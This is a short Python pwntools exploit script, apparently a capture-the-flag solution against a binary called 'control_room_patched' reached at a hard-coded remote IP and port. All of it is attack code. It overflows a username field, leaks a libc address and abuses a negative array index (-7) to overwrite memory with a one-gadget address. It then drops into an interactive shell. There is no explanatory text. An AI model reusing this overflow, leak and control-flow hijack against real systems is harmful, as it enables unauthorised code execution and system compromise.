#!/usr/bin/env python3


from pwn import *

e = ELF("./control_room_patched")
#r = process("./control_room_patched")
r = remote("104.248.169.157",30969)
libc = ELF("./libc.so.6")
r.sendafter(b"Enter a username:",b"A" * 0x100)
r.sendlineafter(b">",b"y")
r.sendlineafter(b"New username size:",b"256")
r.sendafter(b"Enter your new username:",b"B" * 255)
r.sendlineafter(b"Option [1-5]:",b"3")
for i in range(0,8):
    r.sendline(b"-")
r.sendlineafter(b"Do you want to save the route?",b"y")
r.sendlineafter(b"Option [1-5]:",b"4")
r.recvuntil(b"Longitude : ")
leak = int(r.recvline().strip()) - 0x43654
log.info("The libc leak of the process is " + hex(leak))
r.sendlineafter(b"Option [1-5]:",b"5")
r.sendlineafter(b"New role:",b"1")
r.sendlineafter(b"Option [1-5]:",b"1")
r.sendlineafter(b"Engine number [0-3]:",b"-7")
r.sendlineafter(b"Thrust",f"{leak + 0xebcf5}")
r.sendlineafter(b"Mixture ratio",f"{0x4141414141414141}")
r.sendline(b"y")
r.sendlineafter(b"Option [1-5]:",b"6")
r.interactive()
